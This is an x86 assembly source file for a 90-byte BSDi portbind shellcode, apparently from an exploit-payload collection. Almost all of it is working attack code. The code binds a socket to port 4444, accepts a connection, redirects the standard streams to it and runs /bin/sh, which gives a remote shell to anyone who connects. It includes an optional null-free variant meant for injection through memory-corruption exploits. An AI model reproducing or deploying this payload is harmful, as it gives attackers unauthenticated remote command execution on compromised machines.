##
#
# arch    : ia32
# platform: BSDi
# purpose : portbind
# size    : 90 bytes
# author  : skape (mmiller [at] hick.org)
#
##
.globl main

#.equ NONULLS, 1

main:
	nop
__BEGIN__:
startup:

build_lcall:
.ifdef NONULLS
	push   $0x3cfff8ff
	notl   (%esp)
	xor    %eax, %eax
	mov    $0x9a, %al
.else
	push   $0xc3000700
	mov    $0x9a, %eax
.endif
	cdq
	push   %eax
	mov    %esp, %edi

run:
	xor    %ecx, %ecx	
	mul    %ecx
socket:
	push   %eax
	inc    %eax
	push   %eax
	inc    %eax
	push   %eax
	mov    $0x61, %al
	call   *%edi
bind:
	push   %ecx
	push   $0x5c110210
	mov    %esp, %ebx
	push   $0x10
	push   %ebx
	push   %eax
	push   $0x68
	pop    %eax
	call   *%edi
	pop    %esi
listen:
	push   %esi
	mov    $0x6a, %al
	call   *%edi
accept:
	push   %ecx
	push   %ecx
	push   %esi
	mov    $0x1e, %al
	call   *%edi
	mov    %eax, %esi

dup:
	mov    $0x2, %cl
dup_loop:
	mov    $0x5a, %al
	push   %ecx
	push   %esi
	call   *%edi
	dec    %ecx
	jns    dup_loop
execve:
	push   %edx
	push   $0x68732f2f
	push   $0x6e69622f
	mov    %esp, %ebx
	push   %edx
	push   %esp
	push   %ebx
	mov    $0x3b, %al
	call   *%edi

__END__:

	int3
